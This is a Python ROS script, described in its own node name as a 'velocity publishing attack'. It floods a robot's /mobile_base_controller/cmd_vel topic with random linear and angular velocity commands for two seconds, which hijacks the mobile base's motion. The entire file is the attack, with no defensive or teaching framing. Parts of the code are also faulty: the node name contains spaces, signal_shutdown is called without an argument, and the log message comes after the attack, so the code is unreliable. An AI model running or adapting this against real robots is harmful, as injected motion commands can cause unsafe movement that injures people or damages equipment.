#!/usr/bin/env python
import rospy, rostopic
import random
import time
from tf.msg import tfMessage
from move_base_msgs.msg import MoveBaseActionFeedback
from geometry_msgs.msg import Twist
publishers = []


time_sleeping = 2
publishing_duration = 2

def mobile_base_cmd_vel_msg_generator():
  msg = Twist()
  msg.linear.x = random.uniform(-0.3,  0.3)
  msg.linear.y = 0
  msg.linear.z = 0
  msg.angular.x = 0
  msg.angular.y = 0
  msg.angular.z = random.uniform(-0.3,  0.3)
  return msg

def publish_messages(pub, publisher):
  r = rospy.Rate(publisher.rate)
  current_sec = time.time()
  while current_sec - started_sec < publishing_duration:
    msg = publisher.msg_generator()
    pub.publish(msg)
    r.sleep()
    current_sec = time.time()
  rospy.signal_shutdown()
  

def init_publisher(publisher): 
  rospy.init_node('velocity publishing attack', anonymous=True)
  msg_type, _, _ = rostopic.get_topic_class(publisher.topic)
  pub = rospy.Publisher(publisher.topic, msg_type)
  publish_messages(pub, publisher)
  rospy.loginfo("start to attak the topic %s" % (publisher.topic))  
  

def init_publisher_information():
  from collections import namedtuple
  publishers = []
  PublisherInfo = namedtuple("PublisherInfo", "topic rate msg_generator")
  publishers.append(PublisherInfo("/mobile_base_controller/cmd_vel", 10, mobile_base_cmd_vel_msg_generator))
  return publishers
  
if __name__ == '__main__':
  global publishers
  publishers = init_publisher_information()
  time.sleep(time_sleeping)
  started_sec = time.time()
  init_publisher(publishers[0])
  rospy.spin()
